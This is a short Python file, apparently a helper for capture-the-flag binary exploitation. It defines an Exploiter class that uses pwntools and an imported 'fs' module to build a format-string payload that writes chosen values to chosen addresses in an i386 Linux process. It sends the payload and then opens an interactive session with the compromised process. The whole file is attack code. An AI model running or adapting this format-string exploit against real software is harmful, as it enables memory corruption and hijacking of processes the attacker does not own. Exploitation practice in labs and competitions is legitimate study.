# coding=utf-8


from pwn import *
from fs import *


context(arch="i386", os="linux")


class Exploiter(object):
    def __init__(self, target, verbosity="info"):
        self._process = target
        self._verbosity = verbosity
        context.log_level = verbosity
        self._offset = 0
        self._stack = []
        self._bin = []
        self._lib = []
        self._buffer = []

    def _exploit(self, addr, replacement, offset):
        fs = two_by_two(addr, replacement, offset)
        self._process.send(fs).recv()
        self._process.hook_before_exploit()
        self._process.interactive()

    def exploit(self, addr, replacement, offset):
        self._offset = offset
        self._exploit(addr, replacement, offset)
